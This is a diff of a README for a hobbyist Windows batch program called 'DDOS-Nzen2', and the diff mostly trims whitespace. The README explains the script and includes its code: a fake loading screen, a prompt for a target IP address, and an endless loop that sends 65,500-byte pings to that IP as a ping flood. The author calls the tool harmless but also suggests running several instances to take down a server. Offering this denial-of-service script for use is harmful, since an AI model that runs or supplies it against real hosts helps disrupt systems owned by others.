@@ -1,6 +1,6 @@
 # DDOS-Nzen2
 A small DDos program that will (In theory) take down your old 2003 laptop.
-It won't harm anyone, nor anything. 
+It won't harm anyone, nor anything.
 Idk how you would take down a server with this, maybe running multiple instances of it...
 
 Antiviruses DO flag this as a virus/threat, but in reality it's because I have no license with this.
@@ -21,7 +21,7 @@ Random UUids coupled with some strings.
 
 Next chunk is the fake loading screen, which I just added to make
 the whole thing look more organized.
-It echos a started message, (To log.txt) 
+It echos a started message, (To log.txt)
 and then echos ping localhost, (To log.txt)
 then there is a textbook set variable command, (Which then is echoed to log.txt)
 and then a few danger messages,
@@ -66,7 +66,7 @@ Code:
 ::978f952a14a936cc963da21a135fa983
 @echo off
 cls
-title DDos Tool Nzen2- Loading
+title DDos Nzen2- Loading
 echo Started: >> log.txt
 ping localhost >> log.txt
 title DDos Tool Nzen2- Press anything to continue
@@ -77,7 +77,7 @@ goto PreAttack
 :PreAttack
 cls
 echo ---Enter Attack IP---
-set /p AttackIP= 
+set /p AttackIP=
 Echo Attack IP set to %AttackIP%
 echo Attack IP set! >> log.txt
 echo IP: >> log.txt
@@ -96,7 +96,7 @@ goto Attack
 cls
 pause goto DDos
 
-:DDos 
+:DDos
 :loop
 ping %AttackIP% -l 65500 -w 1 -n 1
 goto :loop
